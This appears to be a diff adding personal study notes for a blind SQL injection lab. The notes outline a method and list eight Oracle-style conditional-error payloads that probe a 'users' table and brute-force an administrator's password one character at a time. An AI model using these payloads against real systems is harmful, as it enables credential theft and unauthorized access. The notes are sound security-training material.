@@ -1,0 +1,34 @@
+Blind SQL injection with conditional errors
+
+Uses tracking id and cookies
+
+table name users: username, password
+
+Find administrator password and log in
+
+Error message: Internal Server Error
+
+
+Method:
+1.  Check if vulnerable to SQL injection
+2.  Get tracking id and cookies
+3.  Check if users table exist
+4.  Find administrator's password length: 
+5.  Brute force to get the password
+6.  If condition true: Welcome back
+7.  Else no message
+
+
+Queries:
+1.      '|| (select '' from dual) ||'
+2.      '|| (select '' from users where rownum=1) ||'
+3.      '|| (select '' from users where username='administratorfgfs') ||': no error
+4.      '|| (select case when (1=1) then to_char(1/0) else '' end from users where username='administrator') ||' : error
+5.      '|| (select case when (1=0) then to_char(1/0) else '' end from users where username='administrator') ||' : no error
+6.      '|| (select case when (1=1) then to_char(1/0) else '' end from users where username='administratorffg') ||': no error, but error should have occured, hence username does not exist
+7.      '|| (select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>1) ||' : error. hence length good
+8.      '|| (select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and substr(password,1,1)='a') ||': if error then good
+
+
+
+
